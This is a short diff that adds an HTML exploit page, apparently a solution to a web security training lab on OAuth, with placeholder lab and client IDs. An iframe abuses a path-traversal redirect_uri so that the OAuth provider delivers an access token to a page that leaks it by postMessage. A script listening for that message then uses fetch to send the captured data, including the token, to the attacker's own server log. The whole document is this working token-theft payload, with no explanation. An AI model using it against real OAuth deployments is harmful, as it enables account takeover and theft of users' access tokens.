@@ -1,0 +1,6 @@
+<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
